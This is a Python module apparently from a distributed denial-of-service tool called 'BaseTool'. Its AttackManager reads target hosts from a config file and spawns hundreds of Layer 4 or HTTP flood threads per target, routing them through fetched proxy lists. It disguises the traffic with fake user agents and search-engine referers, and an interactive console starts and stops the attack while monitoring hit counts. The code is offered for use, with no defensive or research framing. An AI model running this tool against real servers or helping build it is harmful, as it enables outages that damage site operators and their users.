from __future__ import annotations

import logging
import os
import socket
import sys
import threading
import time
from pathlib import Path
from typing import Dict, List, Optional

from PyRoxy import Proxy
from yarl import URL

from ..adapter.methods import L4_METHODS, METHOD_REGISTRY, make_attack_thread
from .runtime import resolve_runtime_dir
from .monitor import monitor_loop
from .proxy_manager import ProxyManager

logger = logging.getLogger("BaseTool")


class AttackManager:
    def __init__(self, config: dict, proxy_providers: list):
        self.config = config
        self.proxy_providers = proxy_providers
        self.event = threading.Event()
        self.threads: List[threading.Thread] = []
        self.monitor_thread = None
        self.target_stats: Dict[str, List[int]] = {}
        self.stats_lock = threading.Lock()
        self._proxy_list: Optional[List[Proxy]] = None
        self._proxies_loaded = False
        self.target_keys: List[str] = []
        self.table_height = 0

    def _load_proxies_if_needed(self, proxy_enabled: int, check_url: str) -> Optional[List[Proxy]]:
        if proxy_enabled == 0:
            return None
        if not self._proxies_loaded:
            self._proxy_list = ProxyManager.get_proxies(self.proxy_providers, check_url)
            self._proxies_loaded = True
        return self._proxy_list

    def _spawn_threads(self):
        self.threads.clear()
        target_keys = []

        settings = self.config.get("settings", {})
        default_threads = settings.get("threads", 100)
        default_rpc = settings.get("rpc", 1)
        default_proxy = settings.get("proxy", 0)

        targets = self.config.get("targets")
        if not targets:
            raise ValueError("config.json must define at least one target")

        ua_list = set(self.config.get("useragents", []))
        if not ua_list:
            ua_list = {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
            }
        ref_list = set(self.config.get("referers", []))
        if not ref_list:
            ref_list = {"https://www.google.com/", "https://www.bing.com/"}

        for target in targets:
            method = target["method"].upper()
            if method not in METHOD_REGISTRY:
                raise ValueError(f"Unsupported method: {method}")

            target_str = target["target"]
            ip = target.get("ip")
            threads = target.get("threads", default_threads)
            rpc = target.get("rpc", default_rpc)
            proxy_enabled = target.get("proxy", default_proxy)

            if method in L4_METHODS:
                if "://" in target_str:
                    _, rest = target_str.split("://", 1)
                else:
                    rest = target_str
                if ":" in rest:
                    ip_part, port_part = rest.rsplit(":", 1)
                else:
                    ip_part, port_part = rest, "80"
                port = int(port_part)
                actual_ip = ip if ip else socket.gethostbyname(ip_part)
                key = f"{actual_ip}:{port}"
                target_keys.append(key)
                for _ in range(threads):
                    thread = make_attack_thread(
                        method,
                        target_key=key,
                        stats_dict=self.target_stats,
                        stats_lock=self.stats_lock,
                        synevent=self.event,
                        l4_target=(actual_ip, port),
                    )
                    self.threads.append(thread)
            else:
                url = URL(target_str)
                hostname = url.host
                actual_ip = ip if ip else socket.gethostbyname(hostname)
                key = url.host
                target_keys.append(key)
                proxies = self._load_proxies_if_needed(proxy_enabled, str(url))
                proxy_set = set(proxies) if proxies else None
                for thread_id in range(threads):
                    thread = make_attack_thread(
                        method,
                        target_key=key,
                        stats_dict=self.target_stats,
                        stats_lock=self.stats_lock,
                        synevent=self.event,
                        thread_id=thread_id,
                        url=url,
                        host=actual_ip,
                        rpc=rpc,
                        useragents=ua_list,
                        referers=ref_list,
                        proxies=proxy_set,
                    )
                    self.threads.append(thread)

        seen = set()
        unique_keys = []
        for key in target_keys:
            if key not in seen:
                seen.add(key)
                unique_keys.append(key)
        return unique_keys

    def _calculate_table_height(self):
        try:
            term_height = os.get_terminal_size().lines
        except (ValueError, OSError):
            term_height = 24
        needed = len(self.target_keys) + 4
        return max(5, min(needed, term_height - 2))

    def start(self):
        if self.event.is_set():
            logger.warning("Already running")
            return

        self.target_keys = self._spawn_threads()
        self.table_height = self._calculate_table_height()

        sys.stdout.write("\033[2J\033[H")
        for _ in range(self.table_height):
            print()
        print("Type start/stop/exit")

        with self.stats_lock:
            self.target_stats.clear()

        logger.info(f"Launching {len(self.threads)} threads...")
        for thread in self.threads:
            thread.start()
        self.event.set()

        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=0.5)
        self.monitor_thread = threading.Thread(
            target=monitor_loop,
            args=(
                self.event,
                self.target_stats,
                self.stats_lock,
                self.target_keys,
                self.table_height,
            ),
            daemon=True,
        )
        self.monitor_thread.start()

    def stop(self):
        if not self.event.is_set():
            logger.warning("Attack not running.")
            return
        self.event.clear()
        time.sleep(0.2)
        logger.info("Attack stopped.")


def console(manager: AttackManager):
    manager.start()

    while True:
        prompt_row = manager.table_height + 1
        sys.stdout.write(f"\033[{prompt_row};1H\033[K")
        sys.stdout.flush()
        try:
            cmd = input("BaseTool> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            cmd = "exit"

        if cmd == "start":
            if not manager.event.is_set():
                manager.start()
            else:
                print("Already running.")
        elif cmd == "stop":
            manager.stop()
        elif cmd in ("exit", "quit"):
            if manager.event.is_set():
                manager.stop()
            break
        elif cmd:
            print("Unknown command. Available: start, stop, exit")
